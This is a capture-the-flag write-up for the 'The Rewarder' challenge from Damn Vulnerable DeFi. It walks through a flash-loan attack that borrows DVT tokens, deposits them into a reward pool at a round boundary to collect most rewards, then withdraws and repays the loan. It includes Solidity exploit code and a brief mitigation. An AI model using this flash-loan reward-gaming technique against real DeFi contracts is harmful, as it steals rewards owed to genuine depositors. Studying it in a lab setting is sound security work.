> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

> You don’t have any DVT tokens.
> But in the upcoming round, you must claim most rewards for yourself.

> By the way, rumours say a new pool has just launched.
> Isn’t it offering flash loans of DVT tokens?

## The plan

This challenge is more convoluted: 5 contracts, with 3 tokens and 2 pools.

Still, the intro gives a pretty clear plan:

- loan the maximum amount of `DamnValuableToken` from `FlashLoanerPool`
- deposit these `DamnValuableToken` in the `TheRewarderPool`
- withdraw from the `TheRewarderPool`
- payback the `FlashLoanerPool`

In the meantime, the pool will have sent rewards back while it doesn't hold any liquity as counterpart.

## Timing the loan

If the next round has started, depositing will automatically trigger the rewarding process:

```solidity
function deposit(uint256 amount) external {
    if (amount == 0) { /*...*/ }

    accountingToken.mint(msg.sender, amount);
    distributeRewards(); // <--

    SafeTransferLib.safeTransferFrom(/*...*/);
}
```

And the next round starts when:

```solidity
uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

function isNewRewardsRound() public view returns (bool) {
    return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
}
```

In reality, waiting for the correct time is enough:

```js
await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
```

## Implementation

```solidity
function receiveFlashLoan(uint256 amount) external {
    // move the lent tokens to the rewarder pool
    _liquidityToken.approve(address(_rewarderPool), amount);
    _rewarderPool.deposit(amount);

    // if timed correctly, the rewarder pool sent the rewards

    // payback the loan
    _rewarderPool.withdraw(amount);
    _liquidityToken.transfer(address(_flashLoanPool), amount);

    // transfer the rewards to the player
    uint256 _rewards = _rewardToken.balanceOf(address(this));
    _rewardToken.transfer(_player, _rewards);
}
```

## Mitigations

The liquidity tokens could be locked for a period of time after a deposit.
